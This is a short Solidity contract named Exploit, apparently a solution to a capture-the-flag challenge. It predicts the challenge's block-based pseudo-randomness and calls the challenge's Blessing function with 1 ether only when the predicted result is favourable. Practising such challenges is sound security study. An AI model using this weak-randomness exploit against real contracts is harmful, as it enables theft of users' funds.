pragma solidity ^0.8.0;

interface IChallenge {
    function Blessing() external payable ;
    function ascend() external ;
    function isSolved() external view returns (bool);
}

contract Exploit {
    IChallenge public challenge;
    uint seed;
    address public owner;
    uint counter;

    constructor(address _challenge) payable {
        challenge = IChallenge(_challenge);
        seed = 0x67d59c9c;
        owner = msg.sender;
    }

    function attack() external payable {
        uint256 randomNumber = uint256(keccak256(abi.encodePacked(seed, address(this), block.prevrandao, block.timestamp)));
        uint256 AngelNumber = randomNumber % 2;

        require(AngelNumber == 1, "Error bad angel number");

        challenge.Blessing{value: 1 ether}();
    }

    function reset_counter() public {
        counter = 0;
    }

    function ascend() public payable returns (bool) {
        challenge.ascend();
        return true;
    }

    receive() external payable {
        counter += 1;
    }
}

